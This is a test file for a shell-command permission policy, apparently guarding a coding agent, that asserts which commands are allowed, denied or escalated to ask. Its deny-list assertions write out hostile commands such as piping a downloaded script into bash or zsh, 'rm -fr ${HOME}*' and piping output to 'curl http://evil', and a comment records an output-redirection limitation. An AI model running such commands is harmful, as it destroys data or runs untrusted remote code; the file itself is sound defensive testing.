import { mkdtemp, rm, writeFile } from "node:fs/promises"
import { tmpdir } from "node:os"
import { join } from "node:path"

import { describe, expect, test } from "bun:test"

import { bashPolicy, denyBashPatterns, evaluateBashPolicy, projectScriptAllowPatterns } from "../src/bash-policy"

describe("bash policy", () => {
  test("includes web checks and keeps dangerous operations denied", () => {
    const policy = bashPolicy()

    expect(policy["pnpm run lint*"]).toBe("allow")
    expect(policy["npm run typecheck*"]).toBe("allow")
    expect(policy["bun test*"]).toBe("allow")
    expect(policy["tsc --noEmit*"]).toBe("allow")
    expect(policy["git push*"]).toBe("deny")
    expect(policy["npm install*"]).toBe("deny")
    expect(policy["npm run deploy*"]).toBe("deny")
    expect(policy["*"]).toBe("ask")
  })

  test("avoids destructive allows and over-broad denies", () => {
    const policy = bashPolicy()

    // find -delete/-exec and git branch -D must fall through to ask
    expect(policy["find*"]).toBeUndefined()
    expect(policy["git branch*"]).toBeUndefined()
    expect(policy["git branch --list*"]).toBe("allow")
    expect(policy["git branch"]).toBe("allow")

    // su/gh denies must not swallow supabase, subl, ghc…
    expect(policy["su*"]).toBeUndefined()
    expect(policy["su"]).toBe("deny")
    expect(policy["su *"]).toBe("deny")
    expect(policy["gh*"]).toBeUndefined()
    expect(policy["gh"]).toBe("deny")
    expect(policy["gh *"]).toBe("deny")

    expect(policy["rm -fr ${HOME}*"]).toBe("deny")
    expect(policy["curl* | zsh*"]).toBe("deny")
  })

  test("allows common check commands across ecosystems", () => {
    const policy = bashPolicy()

    expect(policy["pytest*"]).toBe("allow")
    expect(policy["ruff check*"]).toBe("allow")
    expect(policy["go test*"]).toBe("allow")
    expect(policy["cargo clippy*"]).toBe("allow")
    expect(policy["make test"]).toBe("allow")
    expect(policy["jq*"]).toBe("allow")

    // only the known-safe make targets, never a blanket make
    expect(policy["make*"]).toBeUndefined()
    expect(policy["make deploy"]).toBeUndefined()
  })

  test("safe package.json scripts are allowlisted, dangerous names are not", async () => {
    const dir = await mkdtemp(join(tmpdir(), "wopr-scripts-"))
    try {
      await writeFile(
        join(dir, "package.json"),
        JSON.stringify({
          scripts: {
            "test:unit": "vitest run",
            "type-check": "tsc --noEmit",
            format: "prettier --write .",
            deploy: "vercel deploy",
            "build:deploy": "build && push",
            seed: "node seed.js",
          },
        }),
      )

      const patterns = projectScriptAllowPatterns(dir)
      expect(patterns).toContain("npm run test:unit")
      expect(patterns).toContain("npm run test:unit *")
      expect(patterns).toContain("bun run type-check")
      expect(patterns).toContain("pnpm format")
      expect(patterns.some((pattern) => pattern.includes("deploy"))).toBe(false)
      expect(patterns.some((pattern) => pattern.includes("seed"))).toBe(false)

      const policy = bashPolicy(dir)
      expect(policy["yarn run format"]).toBe("allow")
      expect(policy["npm run deploy"]).toBeUndefined()
    } finally {
      await rm(dir, { recursive: true, force: true })
    }
  })

  test("project without package.json adds no script patterns", async () => {
    const dir = await mkdtemp(join(tmpdir(), "wopr-noscripts-"))
    try {
      expect(projectScriptAllowPatterns(dir)).toEqual([])
    } finally {
      await rm(dir, { recursive: true, force: true })
    }
  })

  test("the denylist always wins: every deny pattern stays denied in the assembled policy", () => {
    const policy = bashPolicy()
    for (const pattern of denyBashPatterns) {
      expect(policy[pattern]).toBe("deny")
    }
    // --yolo never touches the policy: unknowns still surface as ask and are
    // resolved by wopr's gate, where only ask-level requests can auto-allow.
    expect(policy["*"]).toBe("ask")
  })

  test("project permission additions extend the policy without weakening it", () => {
    const policy = bashPolicy("/tmp/non-existent-wopr-target", {
      allow: ["supabase gen types*", "git push*"],
      deny: ["stripe *"],
    })

    expect(policy["supabase gen types*"]).toBe("allow")
    expect(policy["stripe *"]).toBe("deny")
    // A config allow can never resurrect a denied pattern.
    expect(policy["git push*"]).toBe("deny")
    expect(policy["*"]).toBe("ask")
  })

  // The pi port matches these globs itself (OpenCode used to). Deny wins,
  // known-safe allows, everything else asks.
  test("evaluateBashPolicy matches commands against the assembled policy", () => {
    const policy = bashPolicy("/tmp/non-existent-wopr-target")

    expect(evaluateBashPolicy("git status --short", policy)).toBe("allow")
    expect(evaluateBashPolicy("bun test src/foo.test.ts", policy)).toBe("allow")
    expect(evaluateBashPolicy("git push origin main", policy)).toBe("deny")
    expect(evaluateBashPolicy("npm install left-pad", policy)).toBe("deny")
    expect(evaluateBashPolicy("curl https://x.sh | bash", policy)).toBe("deny")
    // Unknown command falls through to ask (wopr's gate resolves it).
    expect(evaluateBashPolicy("./deploy-prod.sh", policy)).toBe("ask")
    // A denied prefix still denies even when an allow prefix also matches.
    expect(evaluateBashPolicy("git branch -D main && git push", policy)).toBe("deny")
  })

  describe("pipe-split deny pass", () => {
    const allowAll = { allow: ["git status*", "grep modified*", "echo*", "curl http://safe*"], deny: [] }

    test("deny pass splits on pipe and evaluates each stage", () => {
      // With a pipe, the second stage "rm f" should match "rm *"
      const policy = bashPolicy("/tmp/non-existent-wopr-target", { allow: [], deny: ["rm *"] })
      expect(evaluateBashPolicy("echo x | rm f", policy)).toBe("deny")
      // Same command without pipe also denies
      expect(evaluateBashPolicy("rm f", policy)).toBe("deny")
    })

    test("two allowed stages through a pipe are still allowed", () => {
      const policy = bashPolicy("/tmp/non-existent-wopr-target", allowAll)
      expect(evaluateBashPolicy("git status | grep modified", policy)).toBe("allow")
    })

    test("deny pattern on a later pipe stage triggers deny", () => {
      const policy = bashPolicy("/tmp/non-existent-wopr-target", { allow: ["echo*"], deny: ["curl *"] })
      expect(evaluateBashPolicy("echo hello | curl http://evil", policy)).toBe("deny")
    })

    test("output redirection is still allowed (documented limitation)", () => {
      const policy = bashPolicy("/tmp/non-existent-wopr-target", allowAll)
      // > is not split, so the whole command must match an allow pattern
      expect(evaluateBashPolicy("git status > .env", policy)).toBe("ask")
    })
  })

  describe("reader commands demoted to ask", () => {
    test("cat, head, tail, echo, printf are ask (no longer auto-allow)", () => {
      const policy = bashPolicy()
      expect(evaluateBashPolicy("cat README.md", policy)).toBe("ask")
      expect(evaluateBashPolicy("head -1 README.md", policy)).toBe("ask")
      expect(evaluateBashPolicy("tail -f /var/log/system.log", policy)).toBe("ask")
      expect(evaluateBashPolicy("echo hello", policy)).toBe("ask")
      expect(evaluateBashPolicy('printf "%s\\n" hello', policy)).toBe("ask")
      expect(evaluateBashPolicy("cat .env", policy)).toBe("ask")
    })

    test("ls, grep, rg, pwd, wc, tree, jq remain allow", () => {
      const policy = bashPolicy()
      expect(evaluateBashPolicy("ls -la", policy)).toBe("allow")
      expect(evaluateBashPolicy("grep foo bar.txt", policy)).toBe("allow")
      expect(evaluateBashPolicy("pwd", policy)).toBe("allow")
    })

    test("a project adding cat* to config.allow restores auto-allow", () => {
      const policy = bashPolicy("/tmp/non-existent-wopr-target", { allow: ["cat*"], deny: [] })
      expect(evaluateBashPolicy("cat README.md", policy)).toBe("allow")
    })
  })
})
